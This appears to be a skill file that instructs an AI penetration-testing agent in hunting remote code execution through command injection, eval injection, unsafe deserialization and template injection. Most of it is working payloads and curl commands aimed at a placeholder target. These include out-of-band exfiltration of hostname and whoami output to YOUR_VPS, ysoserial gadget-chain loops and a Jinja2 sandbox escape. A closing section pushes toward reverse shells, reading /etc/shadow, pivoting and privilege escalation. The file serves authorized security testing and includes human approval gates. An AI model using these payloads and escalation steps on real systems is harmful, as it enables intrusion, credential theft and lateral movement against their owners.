---
name: rce
description: >
  Hunt for Remote Code Execution: OS command injection, eval/code injection in dynamic
  languages (PHP, Python, Node, Ruby), and deserialization-driven RCE gadget chains. Use
  when user input reaches a shell call, an interpreter eval, a dynamic function call, or
  an unsafe deserializer. Keywords: rce, command injection, os command injection, eval
  injection, code injection, shell metacharacters, blind command injection, ysoserial,
  gadget chain, unsafe deserialization to RCE, SSTI-to-RCE.
  Do NOT use for template-only injection with no further code-exec primitive — use ssti
  first, then return here once a code-exec sink is found. Do NOT use for pure deserialization
  without demonstrated code execution — use deserialization for that narrower scope, this
  skill for when the chain is pushed through to actual command/code execution.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-78, CWE-94, CWE-502]
  mitre_attack: [T1190, T1059]
  tools: [curl, ffuf, commix, nuclei, ysoserial, metasploit]
depends_on: [active-recon, web-crawling, ssti, deserialization]
feeds_into: [chain-analysis, post-exploitation]
chains_with: [ssti, deserialization, sqli, lfi-rfi, ssrf]
---

## Signals

- Params that plausibly shell out: filenames passed to image converters (ImageMagick,
  ffmpeg), "ping this host" diagnostic tools, PDF generators, export/report filename fields,
  anything wrapping a system binary (`zip`, `unzip`, `convert`, `curl`, `git`).
- Language-specific eval sinks found in source/decompiled code: PHP `eval()`, `assert()`,
  `preg_replace(/e)`, `create_function()`; Python `eval()`, `exec()`, `pickle.loads()`,
  `yaml.load()` (unsafe loader); Node `eval()`, `vm.runInNewContext()`, `child_process.exec()`
  with concatenated strings; Ruby `eval`, `instance_eval`, `Marshal.load`.
- Deserialization endpoints accepting serialized blobs: Java (`rO0AB` magic bytes / base64
  `rO0...`), PHP (`O:8:"ClassName"`), Python pickle (`\x80\x04` opcode header), .NET
  (`AAEAAAD` base64 / `BinaryFormatter`, `ViewState` without MAC validation).
- Confirmed SSTI (ssti) in Jinja2/Twig/FreeMarker/Velocity — these commonly escalate
  straight to RCE via sandbox-escape payloads.
- Response timing anomalies on params that look like they might shell out (ping/traceroute
  tools, DNS lookup tools).

## Prerequisites

- An identified sink candidate (param feeding a shell call, eval, or deserializer) from source
  review, error messages, or behavioral signals.
- An OOB listener (same as ssrf) for blind command injection confirmation.
- For deserialization RCE: knowledge of the server's language/framework and library versions
  (from banners, error stack traces, `Server`/`X-Powered-By` headers, dependency manifests) to
  pick the right `ysoserial` gadget chain.

## Methodology

1. **OS command injection — baseline and metacharacter probe.**
   ```bash
   curl -s "https://target/ping?host=127.0.0.1"
   curl -s "https://target/ping?host=127.0.0.1;id"
   curl -s "https://target/ping?host=127.0.0.1|id"
   curl -s "https://target/ping?host=127.0.0.1\`id\`"
   curl -s "https://target/ping?host=127.0.0.1\$(id)"
   curl -s "https://target/ping?host=127.0.0.1%0aid"      # newline injection
   ```
   Confirm via output reflection (`uid=...` appears in response) first; if not reflected, go
   blind.

2. **Blind command injection — time-based and OOB confirmation.**
   ```bash
   time curl -s "https://target/ping?host=127.0.0.1;sleep 5" -o /dev/null
   # OOB exfil to your own listener — proves execution unambiguously
   curl -s "https://target/ping?host=127.0.0.1;curl http://YOUR_VPS/rce-confirm-\$(hostname)"
   curl -s "https://target/ping?host=\$(curl http://YOUR_VPS/rce-confirm-\$(whoami))"
   ```
   Check your listener's access log for the inbound hit with hostname/whoami data — this is
   solid proof even when nothing comes back in the HTTP response.

3. **Automate with commix once a candidate param is identified:**
   ```bash
   commix --url="https://target/ping?host=127.0.0.1" -p host --batch
   commix --url="https://target/ping" --data="host=127.0.0.1" -p host --level=3
   ```

4. **Eval/code injection (dynamic languages).** Probe for interpreter-specific syntax rather
   than shell metacharacters:
   ```bash
   # PHP eval-style
   curl -s --data-urlencode 'calc=1+1' "https://target/calc"           # baseline
   curl -s --data-urlencode 'calc=phpinfo();' "https://target/calc"
   curl -s --data-urlencode 'calc=system("id");' "https://target/calc"

   # Python eval/exec
   curl -s --data-urlencode "expr=__import__('os').popen('id').read()" "https://target/calc"

   # Node vm/eval
   curl -s --data-urlencode "expr=require('child_process').execSync('id').toString()" \
     "https://target/calc"

   # YAML deserialization (unsafe loader) to RCE — Python PyYAML / Ruby Psych
   curl -s -X POST https://target/api/config -H "Content-Type: application/x-yaml" \
     --data-binary '!!python/object/apply:os.system ["id"]'
   ```

5. **Java deserialization RCE with ysoserial** against a confirmed/suspected deserialization
   sink (identify the sink first via the magic-byte signals above or an exception stack trace
   mentioning `ObjectInputStream`/`readObject`):
   ```bash
   # list available gadget chains for the target's likely library stack
   java -jar ysoserial.jar  # no args -> prints usage + chain list

   # generate a payload for a blind OOB callback (safer first test than a reverse shell)
   java -jar ysoserial.jar CommonsCollections6 \
     'curl http://YOUR_VPS/ysoserial-confirm' -o payload.bin
   base64 -w0 payload.bin > payload.b64

   curl -s -X POST https://target/api/upload \
     -H "Content-Type: application/x-java-serialized-object" \
     --data-binary @payload.bin

   # try several chains if the library/version is unknown — each is a distinct discrete test,
   # not noisy scanning, since each requires a crafted payload matching classpath gadgets:
   for chain in CommonsCollections5 CommonsCollections6 CommonsCollections7 Spring1 Spring2 Groovy1; do
     java -jar ysoserial.jar $chain "curl http://YOUR_VPS/confirm-$chain" -o "/tmp/$chain.bin"
     curl -s -X POST https://target/api/upload --data-binary @"/tmp/$chain.bin" \
       -H "Content-Type: application/x-java-serialized-object"
   done
   ```
   Watch your OOB listener for the chain-specific marker to know exactly which gadget chain is
   viable on the target classpath.

6. **.NET ViewState / BinaryFormatter RCE** (when `__VIEWSTATE` lacks MAC validation or the key
   is known/weak — e.g. a leaked `machineKey`):
   ```bash
   ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter \
     -c "curl http://YOUR_VPS/confirm" -o raw -oe

   # with a known/leaked machineKey (ViewState MAC forgery) — only if that key material was
   # independently discovered (e.g. info-disclosure finding), never brute-forced out-of-scope
   ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "curl http://YOUR_VPS/confirm" \
     --validationkey="LEAKED_KEY" --validationalg="SHA1" \
     --generatorkey="LEAKED_GEN_KEY" --generatoralg="AES" --isdebug --islegacy --minify \
     --apppath="/" --path="/vulnerable.aspx"
   ```

7. **SSTI-to-RCE escalation** — if ssti confirmed template execution, push to OS commands
   using the engine-specific sandbox-escape primitives documented in that skill's payload list
   (e.g. Jinja2 `{{ cycler.__init__.__globals__.os.popen('id').read() }}`).

8. **Nuclei sweep for known RCE CVEs** on fingerprinted software versions (treat purely as
   triage — a template match on version string alone is **Unproven** per project rules until
   the actual payload fires):
   ```bash
   nuclei -l urls.txt -tags rce -severity critical,high -o nuclei_rce.txt
   ```

## Tooling

- `commix` — automated command injection detection/exploitation.
- `ysoserial` (Java) / `ysoserial.net` (.NET) — gadget-chain payload generators; always confirm
  the exact library+version on the classpath before picking a chain, or brute a small curated
  set via OOB markers as above.
- `nuclei -tags rce` — version-fingerprint-driven triage only, never the final proof.
- Your own OOB listener (Interactsh/Burp Collaborator/VPS) — the single most reliable blind-RCE
  confirmation tool across every variant in this skill.
- Metasploit (`msfconsole -q -x "...; exit"` per project rules) — once a reliable RCE vector is
  confirmed and the operator has approved moving to a shell/session, not before.

## Root Causes

- Shelling out via string-concatenated commands (`os.system(f"ping {host}")`,
  `exec("convert " + filename)`) instead of argument-array APIs that avoid a shell
  (`subprocess.run([...], shell=False)`).
- `eval()`/`exec()`/dynamic-function-construction on user input for "calculator"/"formula"/
  "rule engine" features.
- Deserializing untrusted data with a generic/polymorphic deserializer (Java
  `ObjectInputStream`, .NET `BinaryFormatter`, PHP `unserialize()` on user input, Python
  `pickle.loads()`/unsafe `yaml.load()`) instead of a safe data-only format (JSON) or a
  deserializer restricted to an explicit allowlist of classes.
- Missing/weak integrity protection on serialized blobs sent to the client and trusted on
  return (unsigned ViewState, unsigned PHP serialized cookies).

## Validation Gate (minimum proof)

- **Command/eval injection:** command output reflected in the response, OR a verified OOB
  callback (with hostname/whoami/unique token) received on your listener, OR a reproducible
  timing delay matching an injected `sleep` value across multiple trials.
- **Deserialization RCE:** OOB callback received correlated to the specific gadget chain and
  payload sent; document which chain worked (this identifies the exact vulnerable library on
  the classpath).
- Capture the exact request (including the raw payload bytes/base64 for binary payloads) and
  the corresponding listener log entry with timestamp correlation.

## Gotchas

- **Minimum proof, not a shell.** OOB callback execution (`curl` to your listener) is sufficient
  proof of RCE. Escalating to a reverse shell or Metasploit session is an exploitation step that
  needs the explicit human gate per project rules ("Explotar una vulnerabilidad confirmada") —
  don't pop a shell just because you can.
- **Common N/A:** command output appears but is actually the *input* being echoed back
  unexecuted (e.g., a WAF/validation layer stripped the injected part and the app is just
  reflecting the sanitized remainder) — diff carefully against a control payload with no
  metacharacters to confirm genuine execution vs. echo.
- **Common N/A:** a `ysoserial` payload sent but the target returns a generic deserialization
  exception without any OOB hit — the sink likely exists but the classpath lacks a gadget for
  that chain; this is Unproven for RCE (the deserialization sink itself may still be a distinct
  finding — see deserialization), not a confirmed RCE.
- **Overclaim trap:** a detected outdated software version with a *known public RCE CVE* is not
  itself a finding without an actual fired payload — per project anti-fabrication rules, label
  "vulnerable version detected, exploit not yet attempted" as Inferred at most, never report
  impact as Demonstrated from version-matching alone.
- **Overclaim trap:** a `sleep()` timing delay from command injection can be confused with a
  slow backend query — always pair with a zero-delay control request and, where possible, a
  second corroborating OOB-callback test before calling it Demonstrated.
- Blind command injection often fails silently if output redirection isn't handled — try
  appending `2>&1` or redirecting to a reachable path before concluding a vector is dead.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Persistent access** — Can you achieve persistent access (reverse shell, web shell) rather than one-shot command execution?
2. **Sensitive file read** — Can you read /etc/shadow, database config files, or other credential material from the compromised host?
3. **Network pivot** — Can you pivot to internal network services from the compromised host?
4. **Execution context** — What user/service account does the RCE run as (www-data, root, a service account)? This bounds the blast radius.
5. **Privilege escalation** — Can you escalate privileges from the RCE's execution context to root/admin on the host?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- SSTI → RCE (direct escalation — see ssti for the template-engine-specific sandbox escape
  payloads that feed into this skill's OS-command step).
- Deserialization → RCE (this skill is the "push it to execution" half of deserialization).
- SQLi (stacked queries, `xp_cmdshell`, `COPY TO PROGRAM`) → RCE — see sqli chains.
- LFI (log poisoning, PHP wrapper chains) → RCE — see lfi-rfi chains.
- Confirmed RCE is near-always critical severity and the natural handoff point to
  `chain-analysis`/post-exploitation planning — flag immediately per the Gates humanos rule
  before taking any further action on the host.
